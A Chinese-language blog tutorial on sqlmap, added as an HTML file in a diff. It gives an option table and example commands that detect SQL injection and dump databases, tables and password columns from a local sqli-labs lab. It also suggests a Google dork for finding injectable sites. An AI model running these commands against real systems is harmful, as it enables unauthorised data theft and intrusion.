@@ -1,0 +1,1787 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="sqlmap详细使用教程, OrigiN">
+    <meta name="description" content="sqlmap详细使用教程sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。
+sqlmap常用命令
+
+
+选项
+描述
+
+
+
+-h
+显示基本帮助信息
+
+
+-hh
+显示高级帮助信息">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>sqlmap详细使用教程 | OrigiN</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">OrigiN</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">OrigiN</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sqlmap详细使用教程</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Tools/" class="post-category">
+                                Tools
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-03-26
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="sqlmap详细使用教程"><a href="#sqlmap详细使用教程" class="headerlink" title="sqlmap详细使用教程"></a>sqlmap详细使用教程</h1><h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p>
+<h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-h</td>
+<td>显示基本帮助信息</td>
+</tr>
+<tr>
+<td>-hh</td>
+<td>显示高级帮助信息</td>
+</tr>
+<tr>
+<td>–version</td>
+<td>显示版本号</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>详细等级（0-6 默认 1）</td>
+</tr>
+<tr>
+<td></td>
+<td>0：只显示python错误以及重要信息</td>
+</tr>
+<tr>
+<td></td>
+<td>1：显示信息以及警告</td>
+</tr>
+<tr>
+<td></td>
+<td>2：显示debug消息</td>
+</tr>
+<tr>
+<td></td>
+<td>3：显示注入payload</td>
+</tr>
+<tr>
+<td></td>
+<td>4：显示http请求</td>
+</tr>
+<tr>
+<td></td>
+<td>5：显示http响应头</td>
+</tr>
+<tr>
+<td></td>
+<td>6：显示http响应内容</td>
+</tr>
+<tr>
+<td><strong>目标</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-u</td>
+<td>指定目标url</td>
+</tr>
+<tr>
+<td>-d</td>
+<td>直接连接数据库</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>从burp代理日志的解析目标</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>从文件中加载http请求</td>
+</tr>
+<tr>
+<td>-g</td>
+<td>从google dork的结果作为目标url</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>从INI配置文件中加载选项</td>
+</tr>
+<tr>
+<td><strong>Request</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-A</td>
+<td>指定user-agent头</td>
+</tr>
+<tr>
+<td>-H</td>
+<td>额外的header</td>
+</tr>
+<tr>
+<td>-method&#x3D;</td>
+<td>指定HTTP方法（GET&#x2F;POST）</td>
+</tr>
+<tr>
+<td>–data&#x3D;</td>
+<td>通过POST提交数据</td>
+</tr>
+<tr>
+<td>–param-del&#x3D;</td>
+<td>指定参数分隔符</td>
+</tr>
+<tr>
+<td>–cookie&#x3D;</td>
+<td>指定cookie的值</td>
+</tr>
+<tr>
+<td>–cookie-del&#x3D;</td>
+<td>指定cookie分隔符</td>
+</tr>
+<tr>
+<td>–drop-set-cookie</td>
+<td>扔掉response中的set-cookie头</td>
+</tr>
+<tr>
+<td>–random-agent</td>
+<td>使用随机的user-agent头</td>
+</tr>
+<tr>
+<td>–host&#x3D;</td>
+<td>设置host头</td>
+</tr>
+<tr>
+<td>–referer&#x3D;</td>
+<td>指定referer头</td>
+</tr>
+<tr>
+<td>–headers&#x3D;</td>
+<td>额外的headers</td>
+</tr>
+<tr>
+<td>–auth-type&#x3D;</td>
+<td>http认证类型（Basic，NTLM，Digest）</td>
+</tr>
+<tr>
+<td>–auith-cred&#x3D;</td>
+<td>http认证凭证（账号：密码）</td>
+</tr>
+<tr>
+<td>–ignore-proxy</td>
+<td>忽略系统代理（常用于扫描本地文件）</td>
+</tr>
+<tr>
+<td>–proxy&#x3D;</td>
+<td>使用代理</td>
+</tr>
+<tr>
+<td>–proxy-cred&#x3D;</td>
+<td>代理认证证书（账号：密码）</td>
+</tr>
+<tr>
+<td>–delay&#x3D;</td>
+<td>设置延迟时间（两个请求之间）</td>
+</tr>
+<tr>
+<td>–timeout&#x3D;</td>
+<td>超时时来连接前等待（默认 30）</td>
+</tr>
+<tr>
+<td>–retries&#x3D;</td>
+<td>连接超时时重试次数（默认 3）</td>
+</tr>
+<tr>
+<td>–randomize&#x3D;</td>
+<td>随机更改指定的参数的值</td>
+</tr>
+<tr>
+<td>–safe-url&#x3D;</td>
+<td>在测试期间经常访问的URL</td>
+</tr>
+<tr>
+<td>–safe-post&#x3D;</td>
+<td>POST数据发送到安全的URL</td>
+</tr>
+<tr>
+<td>–safe-freq&#x3D;</td>
+<td>两次请求之间穿插一个安全的URL</td>
+</tr>
+<tr>
+<td>–skip-urlencode</td>
+<td>跳过payload数据的URL编码</td>
+</tr>
+<tr>
+<td>–chunked</td>
+<td>使用HTTP分块传输加密POST请求</td>
+</tr>
+<tr>
+<td>–hpp</td>
+<td>使用HTTP参数pollution方法（常用于绕过IPS&#x2F;IDS检测）</td>
+</tr>
+<tr>
+<td>–force-ssl</td>
+<td>强制使用SSL&#x2F;HTTPS</td>
+</tr>
+<tr>
+<td>–eval&#x3D;value</td>
+<td>请求之前提供Python代码（eg：”import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”）</td>
+</tr>
+<tr>
+<td><strong>Optimization</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-o</td>
+<td>打开所有优化开关</td>
+</tr>
+<tr>
+<td>–predict-output</td>
+<td>预测输出（与–threads不兼容）</td>
+</tr>
+<tr>
+<td>–keep-alive</td>
+<td>建立长久的HTTP(S)连接 (与–proxy不兼容)</td>
+</tr>
+<tr>
+<td>–null-connection</td>
+<td>空连接</td>
+</tr>
+<tr>
+<td>–threads&#x3D;value</td>
+<td>设置线程(默认 1)</td>
+</tr>
+<tr>
+<td><strong>Injection</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定测试参数</td>
+</tr>
+<tr>
+<td>–skip&#x3D;</td>
+<td>跳过指定参数的测试</td>
+</tr>
+<tr>
+<td>–skip-static</td>
+<td>跳过测试静态的参数</td>
+</tr>
+<tr>
+<td>–dbms&#x3D;</td>
+<td>指定具体DBMS</td>
+</tr>
+<tr>
+<td>–os&#x3D;</td>
+<td>指定DBMS操作系统</td>
+</tr>
+<tr>
+<td>–invalid-bignum</td>
+<td>使用大数字使值无效</td>
+</tr>
+<tr>
+<td>–invalid-logical</td>
+<td>使用逻辑符使值无效</td>
+</tr>
+<tr>
+<td>–invalid-string</td>
+<td>使用字符串使值无效</td>
+</tr>
+<tr>
+<td>–no-cast</td>
+<td>关闭payload铸造机制</td>
+</tr>
+<tr>
+<td>–no-escape</td>
+<td>关闭字符转义机制（默认自动开启）</td>
+</tr>
+<tr>
+<td>–prefix&#x3D;</td>
+<td>加入payload前缀</td>
+</tr>
+<tr>
+<td>–suffix&#x3D;</td>
+<td>加入payload后缀</td>
+</tr>
+<tr>
+<td>–tamper&#x3D;</td>
+<td>指定使用的脚本</td>
+</tr>
+<tr>
+<td><strong>Detection</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>–level&#x3D;</td>
+<td>指定测试的等级（1-5 默认为1）</td>
+</tr>
+<tr>
+<td>–risk&#x3D;</td>
+<td>指定测试的风险（0-3 默认为1）</td>
+</tr>
+<tr>
+<td>–string&#x3D;</td>
+<td>登录成功时，页面所含有的“关键字” 用于证明已经登录成功</td>
+</tr>
+<tr>
+<td>–not-string&#x3D;</td>
+<td>登录成功时，页面所含有的“关键字” 用于证明已经登录失败</td>
+</tr>
+<tr>
+<td>–code&#x3D;</td>
+<td>查询为真时，匹配的HTTP代码</td>
+</tr>
+<tr>
+<td>–smart</td>
+<td>当有大量检测目标时，只选择基于错误的检测结果</td>
+</tr>
+<tr>
+<td>–text-only</td>
+<td>仅基于文本内容比较网页</td>
+</tr>
+<tr>
+<td>–titles</td>
+<td>仅基于标题比较网页</td>
+</tr>
+<tr>
+<td><strong>Techniques</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>–technique&#x3D;</td>
+<td>指定sql注入技术（默认BEUSTQ）</td>
+</tr>
+<tr>
+<td>–time-sec&#x3D;</td>
+<td>基于时间注入检测相应的延迟时间（默认为5秒）</td>
+</tr>
+<tr>
+<td>–union-clos&#x3D;</td>
+<td>进行查询时，指定列的范围</td>
+</tr>
+<tr>
+<td>–union-char&#x3D;</td>
+<td>指定暴力破解列数的字符</td>
+</tr>
+<tr>
+<td><strong>Fingerprint</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-f</td>
+<td>查询目标DBMS版本指纹信息</td>
+</tr>
+<tr>
+<td><strong>Emuneration</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-a</td>
+<td>查询所有</td>
+</tr>
+<tr>
+<td>-b</td>
+<td>查询目标DBMS banner信息</td>
+</tr>
+<tr>
+<td>–current-user</td>
+<td>查询目标DBMS当前用户</td>
+</tr>
+<tr>
+<td>–current-db</td>
+<td>查询目标DBMS当前数据库</td>
+</tr>
+<tr>
+<td>–is-dba</td>
+<td>查询目标DBMS当前用户是否为DBA</td>
+</tr>
+<tr>
+<td>–users</td>
+<td>枚举目标DBMS所有的用户</td>
+</tr>
+<tr>
+<td>–paswords</td>
+<td>枚举目标DBMS用户密码哈希值</td>
+</tr>
+<tr>
+<td>–privileges</td>
+<td>枚举目标DBMS用户的权限</td>
+</tr>
+<tr>
+<td>–roles</td>
+<td>枚举DBMS用户的角色</td>
+</tr>
+<tr>
+<td>–dbs</td>
+<td>枚举DBMS所有的数据库</td>
+</tr>
+<tr>
+<td>–tables</td>
+<td>枚举DBMS数据库中所有的表</td>
+</tr>
+<tr>
+<td>–columns</td>
+<td>枚举DBMS数据库表中所有的列</td>
+</tr>
+<tr>
+<td>–count</td>
+<td>检索表的条目的数量</td>
+</tr>
+<tr>
+<td>–dump</td>
+<td>存储DBMS数据库的表中的条目</td>
+</tr>
+<tr>
+<td>–dump-all</td>
+<td>存储DBMS所有数据库表中的条目</td>
+</tr>
+<tr>
+<td>–D db</td>
+<td>指定进行枚举的数据库名称</td>
+</tr>
+<tr>
+<td>–T  table</td>
+<td>指定进行枚举的数据库表名称</td>
+</tr>
+<tr>
+<td>–C  column</td>
+<td>指定进行枚举的数据库列名称</td>
+</tr>
+<tr>
+<td>–exclude-sysdbs</td>
+<td>枚举表时排除系统数据库</td>
+</tr>
+<tr>
+<td>–sql-query</td>
+<td>指定查询的sql语句</td>
+</tr>
+<tr>
+<td>–sql-shell</td>
+<td>提示输入一个交互式sql shell</td>
+</tr>
+<tr>
+<td><strong>Brute force</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>–common-tables</td>
+<td>暴力破解表</td>
+</tr>
+<tr>
+<td>–common-colomns</td>
+<td>暴力破解列</td>
+</tr>
+<tr>
+<td><strong>File system access</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>–file-read</td>
+<td>从目标数据库管理文件系统读取文件</td>
+</tr>
+<tr>
+<td>–file-write</td>
+<td>上传文件到目标数据库管理文件系统</td>
+</tr>
+<tr>
+<td>–file-dest</td>
+<td>指定写入文件的绝对路径</td>
+</tr>
+<tr>
+<td>–os-cmd&#x3D;</td>
+<td>执行操作系统命令</td>
+</tr>
+<tr>
+<td>–os-shell</td>
+<td>交互式的系统shell</td>
+</tr>
+<tr>
+<td>–os-pwn</td>
+<td>获取一个OOB shell，Meterpreter或者VNC</td>
+</tr>
+<tr>
+<td>–os-smbrelay</td>
+<td>一键 获取一个OOB shell，Meterpreter或者VNC</td>
+</tr>
+<tr>
+<td>–os-bof</td>
+<td>储存过程缓冲区溢出利用</td>
+</tr>
+<tr>
+<td>–os-esc</td>
+<td>数据库进程用户权限提升</td>
+</tr>
+<tr>
+<td>–msf-path&#x3D;</td>
+<td>Metasploit Framework本地安装路径</td>
+</tr>
+<tr>
+<td><strong>General</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>-s</td>
+<td>sqlite会话文件保存位置</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>记录所有HTTP流量到指定文件中</td>
+</tr>
+<tr>
+<td>–batch</td>
+<td>测试过程中，执行所有默认配置</td>
+</tr>
+<tr>
+<td>–charset&#x3D;v</td>
+<td>强制用于数据检索的字符编码</td>
+</tr>
+<tr>
+<td>–crawl&#x3D;</td>
+<td>从目标URL开始爬取网站</td>
+</tr>
+<tr>
+<td>–crawl-exclude&#x3D;</td>
+<td>禁止爬取某个页面（eg：logout）</td>
+</tr>
+<tr>
+<td>–csv-del&#x3D;</td>
+<td>指定CSV输出中使用的的字符</td>
+</tr>
+<tr>
+<td>–dump-format&#x3D;</td>
+<td>储存数据的方式（CSV(default)，HTML，SQLITE）</td>
+</tr>
+<tr>
+<td>–flush-session</td>
+<td>刷新当前目标的会话文件</td>
+</tr>
+<tr>
+<td>–fresh-queries</td>
+<td>忽略会话文件中储存的查询结果，重新查询</td>
+</tr>
+<tr>
+<td>–hex</td>
+<td>使用DBMS hex函数进行数据检索</td>
+</tr>
+<tr>
+<td>–outpout-dir&#x3D;</td>
+<td>自定义输出目录</td>
+</tr>
+<tr>
+<td>–save&#x3D;</td>
+<td>保存选项到INI配置文件中</td>
+</tr>
+<tr>
+<td>–scope&#x3D;</td>
+<td>使用正则表达式从提供的日志中guo’l</td>
+</tr>
+<tr>
+<td>–alert</td>
+<td>再找到SQL注入时运行主机操作系统命令</td>
+</tr>
+<tr>
+<td>–purge-output</td>
+<td>安全的从输出目录中删除所有内容</td>
+</tr>
+<tr>
+<td>–sqlmap-shell</td>
+<td>提示输入交互式sqlmap shell</td>
+</tr>
+<tr>
+<td>–update</td>
+<td>更新sqlmap</td>
+</tr>
+</tbody></table>
+<h3 id="sqlmap注入技术简介"><a href="#sqlmap注入技术简介" class="headerlink" title="sqlmap注入技术简介"></a>sqlmap注入技术简介</h3><p>–technique&#x3D;   （默认全部使用）</p>
+<p>B    基于布尔的盲注</p>
+<p>T    基于时间的盲注</p>
+<p>E    基于报错的注入</p>
+<p>U    基于UNION查询注入</p>
+<p>S    基于多语句查询注入</p>
+<h3 id="sqlmap获取目标方式"><a href="#sqlmap获取目标方式" class="headerlink" title="sqlmap获取目标方式"></a>sqlmap获取目标方式</h3><p><strong>1.指定目标url</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”</p>
+<p><strong>2.从文件中获取多个url</strong></p>
+<p>sqlmap -m 1.txt</p>
+<p><strong>3.从文件中加载HTTP请求</strong></p>
+<p>sqlmap -r url.txt</p>
+<p><strong>4.利用google获取目标</strong></p>
+<p>sqlmap -g “inurl:&quot;.php?id&#x3D;1&quot;“</p>
+<p><strong>5.从burp日志中获取目标</strong></p>
+<p>sqlmap -l   burp.txt</p>
+<h3 id="实例演示-sqlmap注入检测"><a href="#实例演示-sqlmap注入检测" class="headerlink" title="实例演示-sqlmap注入检测"></a>实例演示-sqlmap注入检测</h3><p><strong>1.GET参数注入</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”</p>
+<p><strong>2.POST参数注入</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1” –data&#x3D;”id&#x3D;1”</p>
+<p><strong>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）</strong>  </p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 2</p>
+<p>如图，用 * 号指定cookie，这样就可以检测cookie。</p>
+<p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p>
+<p><strong>4.user-agent注入</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 3</p>
+<p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997621.png" alt="img"></p>
+<p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p>
+<p><strong>5.referer注入</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 3</p>
+<p>如图，用 * 号指定referer，这样就可以检测referer。</p>
+<p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p>
+<p><strong><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997622.png" alt="img"></strong></p>
+<p><strong>6.host注入</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 5</p>
+<p>如图，用 * 号指定host，这样就可以检测host。</p>
+<p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997623.png" alt="img"></p>
+<h3 id="实例演示-获取数据库信息"><a href="#实例演示-获取数据库信息" class="headerlink" title="实例演示-获取数据库信息"></a>实例演示-获取数据库信息</h3><p><strong>1.查看数据库</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –dbs –batch</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997624.png" alt="img"></p>
+<p><strong>2.查看数据库里面的表</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –tables –batch</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997635.png" alt="img"></p>
+<p><strong>3.查看数据库表里面的列</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –T users –columns  –batch</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997636.png" alt="img"></p>
+<p><strong>4.查看数据库列里面的具体的值</strong></p>
+<p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –T users -C password   –dump –batch</p>
+<p><img src="/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997637.png" alt="img"></p>
+<h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p><strong>使用条件：</strong></p>
+<p>1.MySQL数据库版本小于5.0，没有information——schema表。</p>
+<p>2.Microssoft Access数据库。</p>
+<p>3.当前用户没有权限读取系统中保存的数据。</p>
+<p>*<strong>暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</strong></p>
+<p><strong>1.暴力破解表名</strong></p>
